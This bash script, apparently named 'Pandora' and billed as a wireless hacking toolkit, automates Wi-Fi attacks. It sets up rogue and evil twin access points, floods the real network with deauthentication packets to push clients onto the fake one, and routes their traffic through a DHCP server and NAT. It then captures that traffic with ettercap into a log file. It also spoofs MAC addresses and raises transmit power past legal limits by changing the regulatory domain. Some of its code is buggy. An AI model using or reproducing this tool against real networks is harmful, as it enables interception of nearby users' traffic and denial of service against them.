#!/bin/bash

# ~~~~~~~~~~ Environment Setup ~~~~~~~~~~ #
# Text color variables - saves retyping these awful ANSI codes
normal="\e[0m"			# normal text
bold="\e[1m"; 
lightgreen="\e[92m"
lightblue="\e[94m" 		# questions  lightblue
aqua="\e[36m"
lightyellow="\e[93m"
lightred="\e[91m"
package="\e[34m" 			# packageault text blue
warn=$lightred 			
info=$lightyellow 		
interfaces_info=$lightgreen


# Display size variables - to center the text
	 			# resize terminal
				# background black
trap exit_fn INT		# trap CTRL+C

# ~~~~~~~~~~ Local Variables Setup ~~~~~~~~~~ #
if_launched_ap="false"
if_launched_airdoump="false"
if_launched_aireplay="false"
if_launched_dhcp="false"
if_launched_sniffer="false"
IFACE="null"
WIFACE="null"
MIFACE="null"
MIFACE_1="null"
TIFACE="null"
check="fail"


function display_banner()
{
	echo -e "${warn}
  ########:::::'###::::'##::: ##:'########:::'#######::'########:::::'###::::
  ##.... ##:::'## ##::: ###:: ##: ##.... ##:'##.... ##: ##.... ##:::'## ##:::
  ##:::: ##::'##:. ##:: ####: ##: ##:::: ##: ##:::: ##: ##:::: ##::'##:. ##::
  ########::'##:::. ##: ## ## ##: ##:::: ##: ##:::: ##: ########::'##:::. ##:
  ##.....::: #########: ##. ####: ##:::: ##: ##:::: ##: ##.. ##::: #########:
  ##:::::::: ##.... ##: ##:. ###: ##:::: ##: ##:::: ##: ##::. ##:: ##.... ##:
  ##:::::::: ##:::: ##: ##::. ##: ########::. #######:: ##:::. ##: ##:::: ##:
 ..:::::::::..:::::..::..::::..::........::::.......:::..:::::..::..:::::..::"
}

function copyright()
{
echo -e "${lightblue}
[---]      The Wireless Hacking Toolkit (${lightyellow}Pandora ${lightblue})     [---] 
${lightblue}[---]        Created by: ${lightred}Alexandre Teyar ${lightblue}(${lightyellow}Ares${lightblue})        ${lightblue}[---]  
[---]                 Version: ${lightred}0.1 ${lightblue}                    [---]
[---]                Codename: ${lightblue}'${lightyellow}Alpha${lightblue}'                 ${lightblue}[---]
[---]           Follow me on github: ${aqua}@Ares             ${lightblue}[---]
"
}

function main_menu()
{
	if [[ ! -x /usr/sbin/dhcpd ]];then
		check_packages
	fi

	display_banner
	copyright

	echo -e "${normal}Select from the menu:

   1)  Rogue access point
   2)  Evil twin access point
   3)  Display/hide DHCP leases
   4)  Start/stop sniffing
   5)  Deauth clients
   6)  Boost the wireless device power
   99) Exit from the script 
   Press ctrl+c to escape at anytime${aqua}
"
	 
	read -p "pandora> " choice

	if [[ $choice = 1 ]];then
		clean_up > /dev/null
		if_launched_ap="true"
		set_up_rogue
		reset
		main_menu
		
	elif [[ $choice = 2 ]];then
		clean_up > /dev/null
		if_launched_ap="true"
		eviltwin_menu
		set_up_eviltwin
		reset
		main_menu
		
	elif [[ $choice = 3 ]];then
		if [[ $if_launched_ap = "false" ]];then
			echo -e "${warn}You need first to set up an access point you idiot!"
			sleep 2
			main_menu
		else
			if [[ $if_launched_dhcp = "false" ]];then
				display_dhcp_leases
				$if_launched_dhcp = "true"
				reset
				main_menu
			else
				hide_dhcp_leases
				$if_launched_dhcp = "false"
				reset
				main_menu
			fi
		fi
	
	elif [[ $choice = 4 ]];then
		if [[ $if_launched_ap = "false" ]];then
			echo -e "${warn}You need first to set up an access point you idiot!"
			sleep 2
			main_menu
		else
			if [[ $if_launched_sniffer = "false" ]];then
				start_sniffing
				if_launched_sniffer="true"
				reset
				main_menu
			else
				stop_sniffing
				if_launched_sniffer="false"
				reset
				main_menu
			fi
		fi
	
	elif [[ $choice = 5 ]];then
		if [[ $if_launched_ap = "false" ]];then
			echo -e "${warn}You need first to set up an access point you idiot!"
			sleep 2
			main_menu
		else
			if [[ $if_launched_ap = "true" && $if_launched_aireplay = "false" ]];then
				xterm -fg green -geometry 97x32-594-0 -T "aireplay-ng" -e "aireplay-ng --deauth 0 --ignore-negative-one -a $target_BSSID $MIFACE" & 
				xterm_aireplay_deauth=$(pgrep --newest xterm)
				if_launched_aireplay="true"
				reset
				main_menu
			else
				kill $xterm_aireplay_deauth > /dev/null
				if_launched_aireplay=="false"
				reset
				main_menu
			fi
		fi

	elif [[ $choice = 6 ]];then
		boost_up_interface
		reset
		main_menu

	elif [[ $choice = 99 ]];then
		exit_fn
	else
		main_menu
	fi
}

rogue_menu()
{
echo -e "${normal}
The ${bold}Blackhole ${normal}access point type will respond to all probe requests (the access point may receive a lot of requests in crowded places - high charge).

The ${bold}Bullzeye ${normal}access point type will respond only to the probe requests specifying the access point ESSID.

   1) Blackhole
   2) Bullzeye
${aqua}"

	while [[ $ap_type = "fail" || -z $ap_type  ]]
	do
 		read -p "pandora> " ap_type
		
		case $$ap_type in 
			[1-2])
				check="success";;
        		*) 
				check="fail";;
		esac
	done
	check="fail"
}

eviltwin_menu()
{
	echo -e "${normal}
This attack consists in creating an evil copy of an access point and keep sending deauth packets to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID and wireless channel than the targeted access point.

To properly perform this attack the attacker should first check out all the in-range access point copy the BSSID, the ESSID and the channel of the target then create its twin
and finally deauthentificate all the clients from the righfully access point network so they may connect to ours. 
${aqua}"
}

function check_packages()
{
	if [[ ! -x /usr/sbin/dhcpd || ! -x /usr/sbin/wicd ]];then
		echo -e "${warn}You need to install isc-dhcp-server and wicd!"
		echo -e "${normal}Do you want to do them now?(y/n)${aqua}"
 		read -p "pandora> " choice

		if [[ $choice = y ]];then
			echo -e "${package}"
			apt-get install isc-dhcp-server
			apt-get install wicd
	
		else
			echo -e "${warn}Come on dude, you cannot do anything without those packages!"
			sleep 2
		fi
	fi
}

function check_device() # from "quickset" - checks device exists
{
	outcome=$(ifconfig -a $device_to_check 2>&1 | awk '{print $2}')  # &> redirects stdout and stderr; prevents screen clutter

	if [[ $outcome = "error" ]];then
		echo -e "${warn}Device $device_to_check does NOT exist"
		sleep 2
		check="fail"
	else
		check="success"
	fi
}  

function set_up_iptables()
{
	# cleaning the mess
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	# iptables rules
	#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 130.243.158.1 # DNS
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE # Internet facing interface
}

function set_up_dhcp_server()
{
	echo "1" > /proc/sys/net/ipv4/ip_forward
	# Change IP addresses as configured in your dhcpd.conf
	ifconfig $TIFACE up
	ifconfig $TIFACE 10.0.0.254 netmask 255.255.255.0 
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
	
	# Reset any pre-existing dhcp leases
	echo > /var/lib/dhcp/dhcpd.leases 
	cat /dev/null > /tmp/dhcpd.conf
	
	# Copy the conf files for the DHCP serv
	cp ./conf/dhcpd.conf /etc/dhcp/dhcpd.conf 
	cp ./conf/isc-dhcp-server /etc/default/isc-dhcp-server

	# Starting the DHCP service
	dhcpd -cf /etc/dhcp/dhcpd.conf at0 &> /dev/null
	/etc/init.d/isc-dhcp-server start &> /dev/null
}
     
function set_up_interfaces()
{
	echo -e "${interfaces_info}\nAvailable interfaces:"
	ifconfig -a | grep eth | awk '{ print $1" "$5 }' 2>/dev/null
	ifconfig -a | grep wlan | awk '{ print $1" "$5 }'
	while [[ $check = "fail" || -z $IFACE ]]
	do
		echo -e "${normal}\nInternet connected interface?${aqua}"
 		read -p "pandora> " IFACE

		device_to_check=$IFACE
		check_device
	done
	check="fail"

	echo -e "${normal}Do you want to change ${bold}$IFACE ${normal}MAC address(can cause troubles)?(y/n)${aqua}"
	read -p "pandora> " choice

	if [[ $choice = "y" ]];then
		echo -e "${info}[*] Macchanging $IFACE..."
		ifconfig $IFACE down && macchanger -A $IFACE && ifconfig $IFACE up
		echo -e "${warn}\nYou need to reconnect to internet!"
		echo -e "${warn}If having problems, RESTART networking(/etc/init.d/network restart), or use wicd(wicd-client)"
	fi

	rfkill unblock wifi # prevent wlan adapter soft blocking

	echo -e "${interfaces_info}\nAvailable wireless interfaces:"
	ifconfig -a | grep wlan | awk '{ print $1" "$5 }' # displays available interfaces
	while [[ $check = "fail" || -z $WIFACE  ]]
	do
		echo -e "${normal}Wireless interface to use to create the access point?${aqua}"
 		read -p "pandora> " WIFACE

		device_to_check=$WIFACE
		check_device

		if [[ $WIFACE = $IFACE ]];then
			echo -e "${warn}$IFACE is in use, stupid. Try another time..."
			check="fail"
		fi
	done
	check="fail"

	echo -e "${info}\n[*] Starting monitor mode..." # automatically assigns the mon interface to "monitor"
	MIFACE=$(airmon-ng start $WIFACE | grep enabled | awk '{print $5}' | cut -c -4)
	sleep 4 # crucial, to let WIFACE come up before macchanging

	device_to_check=$MIFACE
	check_device
	if [[ $check = "fail" || -z $MIFACE ]];then
		set_up_interfaces
	fi
	check="fail"

	echo -e "${normal}Do you want to change ${bold}$WIFACE ${normal}and ${bold}$MIFACE ${normal}MAC addresses(recommanded)?(y/n)${aqua}"
 	read -p "pandora> " choice

	if [[ $choice = "y" ]];then
		echo -e "${info}[*] Macchanging $WIFACE and $MIFACE..."
		ifconfig $WIFACE down && macchanger -A $WIFACE && ifconfig $WIFACE up
		WIFACE_MAC=$(ifconfig $WIFACE | grep $WIFACE | awk '{ print $5 }') # Reads the random mac so it can be assigned to all subsequent interfaces and avoid airbase-ng errors
		ifconfig $MIFACE down && macchanger -m $WIFACE_MAC $MIFACE &> /dev/null && ifconfig $MIFACE up
	fi
}

function set_up_rogue()
{	
	if [[ ! -x /usr/sbin/dhcpd ]];then
		check_packages
	fi

	set_up_interfaces
		
	rogue_menu

	echo -e "${normal}\nAccess point ESSID?${aqua}"
 	read -p "pandora> " ESSID

	while [[ $check = "fail" || -z $WCHAN ]]
	do
		echo -e "${normal}Wireless channel for the AP(1-12)?${aqua}"
 		read -p "pandora> " WCHAN

		case $WCHAN in 
			[1-9]|1[0-2])
				check="success";;
			*) 
				echo -e "${warn}$WCHAN is not a valid wireless channel, stupid."
				sleep 2
				check="fail";;
		esac
	done
	check="fail"

	echo -e "${normal}Access point WEP authentication?(y/n)${aqua}"
 	read -p "pandora> " choice
	
	if [[ $ap_type = 1 ]];then
		if [[ $var = "y" ]];then
			echo -e "${normal}Enter a valid WEP password(10 hexadecimal characters)${aqua}"
 			read -p "pandora> " WEP 
			xterm -fg green -geometry 98x33-0-0 -T "Blackhole - $ESSID access point" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID-P $MIFACE | tee ./conf/airbase_output.txt" & 
			sleep 4  # crucial, to let TIFACE come up before setting it up
		else
			xterm -fg green -geometry 98x33-0-0 -T "Blackhole - $ESSID access point" -e "airbase-ng -c $WCHAN -e $ESSID -P $MIFACE | tee ./conf/airbase_output.txt" & 
			sleep 4  # crucial, to let TIFACE come up before setting it up	
		fi
	
	elif [[ $ap_type = 2 ]];then
		if [[ $var = "y" ]];then
			echo -e "${normal}Enter a valid WEP password(10 hexadecimal characters)${aqua}"
 			read -p "pandora> " WEP 
			xterm -fg green -geometry 98x33-0-0 -T "Bullzeye - $ESSID access point" -e "airbase-ng  -w $WEP -c $WCHAN -e $ESSID $MIFACE | tee ./conf/airbase_output.txt" & 
			sleep 4  # crucial, to let TIFACE come up before setting it up
		else
			xterm -fg green -geometry 98x33-0-0 -T "Bullzeye - $ESSID access point" -e "airbase-ng -c $WCHAN -e $ESSID $MIFACE | tee ./conf/airbase_output.txt" & 
			sleep 4  # crucial, to let TIFACE come up before setting it up	
		fi
	fi

	xterm_rogue_pid=$(pgrep --newest Eterm)
	TIFACE=$(cat ./conf/airbase_output.txt| grep 'Created tap interface' | awk '{print $5}')

	device_to_check=$TIFACE
	check_device
	if [[ $check = "fail" || -z $TIFACE ]];then
		echo -e "${warn}An airbase-ng error occurs - could not create the tap interface"
		echo -e "${warn}Bye-bye no0b!"
		sleep 2
		exit_fn
	fi

	set_up_dhcp_server
	set_up_iptables
	
	echo -e "${lightblue}\n[*] $ESSID access point is now running... "
	echo -e "${lightblue}[*] Have fun! :) "
	sleep 4
}

set_up_eviltwin()
{
	set_up_interfaces

	echo -e "${normal}\nAccess point ESSID?${aqua}"
 	read -p "pandora> " target_ESSID
	
	echo -e "${normal}\nAccess point BSSID?${aqua}"
	read -p "pandora> " target_BSSID

	while [[ $check = "fail" || -z $WCHAN ]]
	do
		echo -e "${normal}Wireless channel for the AP(1-12)?${aqua}"
 		read -p "pandora> " WCHAN

		case $WCHAN in 
			[1-9]|1[0-2])
				check="success";;
			*) 
				echo -e "${warn}$WCHAN is not a valid wireless channel, stupid."
				sleep 2
				check="fail";;
		esac
	done
	check="fail"
	
	xterm -fg green -geometry 98x33-0-0 -T "Bullzeye - $target_ESSID access point" -e "airbase-ng -c $WCHAN -e $target_ESSID $MIFACE | tee ./conf/airbase_output.txt" & 
	sleep 4  # crucial, to let TIFACE come up before setting it up	


	xterm_eviltwin_pid=$(pgrep --newest Eterm)
	TIFACE=$(cat ./conf/airbase_output.txt| grep 'Created tap interface' | awk '{print $5}')
	
	device_to_check=$TIFACE
	check_device
	if [[ $check = "fail" || -z $TIFACE ]];then
		echo -e "${warn}An airbase-ng error occurs - could not create the tap interface"
		echo -e "${warn}Bye-bye no0b!"
		sleep 2
		exit_fn
	fi

	set_up_iptables
	set_up_dhcp_server
	
	echo -e "${lightblue}\n[*] $target_ESSID access point is now running... "
	echo -e "${lightblue}[*] Have fun! :) "
	sleep 4	
}

function start_sniffing()
{
	cp ./conf/etter.conf /etc/ettercap/etter.conf 
	Eterm --trans --cmod 50 --foreground-color green --buttonbar no --scrollbar no --geometry 195x40-0+0 --title "Ettercap" -e ettercap -L ./logfiles/sniffed.txt -d -Tq -i $TIFACE &
	Eterm_sniffer_pid=$(pgrep --newest Eterm)
	is_sniffer_launched="launched"
	sleep 2
	echo "1" > /proc/sys/net/ipv4/ip_forward
}

function stop_sniffing()
{
	kill $Eterm_sniffer_pid &> /dev/null
	pkill ettercap
}

function display_dhcp_leases()
{
	Eterm --trans --cmod 50 --foreground-color green --buttonbar no --scrollbar no --geometry 97x32-594-0 --title "DHCP Server" -q -e tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null &
	Eterm_dhcp_pid=$(pgrep --newest Eterm)
}

function hide_dhcp_leases()
{
	kill $Eterm_dhcp_pid &> /dev/null
	is_dhcp_launched="not launched"
}

boost_up_interface()
{
	echo -e "${interfaces_info}\nAvailable wireless interfaces:"
	ifconfig -a | grep wlan | awk '{ print $1" "$5 }' # displays available interfaces
	while [[ $check = "fail" || -z $WIFACE_power_up  ]]
	do
		echo -e "${normal}What wireless interface do you want to boost up?${aqua}"
 		read -p "pandora> " WIFACE_power_up

		device_to_check=$WIFACE_power_up
		check_device
	done
	check="fail"

	ifconfig $WIFACE_power_up down
	iw reg set BO
	ifconfig $WIFACE_power_up up
	echo -e "${normal}\nHow much do you want to boost the power of $WIFACE_power_up(up to 30dBm)${aqua}"
	read -p "pandora> " my_boost
	iwconfig $WIFACE_power_up txpower $my_boost
	echo -e "${info}\n[*] $WIFACE_power_up power up!"
	sleep 4
}

function clean_up()
{
	echo -e "${warn}Stopping processes..."
	sleep 1

	killall -q tail airmon-ng airbase-ng airplay-ng dhclient dhcpd driftnet-ng ettercap NetworkManager wpa_supplicant &> /dev/null
	rm -f ./conf/airbase_output.txt 
	
	device_to_check=$MIFACE
	check_device &> /dev/null
	if [[ ! $check = "fail" ]];then
		echo -e "${warn}Demounting $MIFACE interface..."
		airmon-ng stop $MIFACE &> /dev/null
		sleep 1
	fi
	check="fail"

	device_to_check=$MIFACE_1
	check_device &> /dev/null
	if [[ ! $check = "fail" ]];then
		echo -e "${warn}Demounting $MIFACE_1 interface..."
		airmon-ng stop $MIFACE_1 &> /dev/null
		sleep 1
	fi
	check="fail"
}

function exit_fn()
{
	clean_up
	reset
	exit
}

main_menu
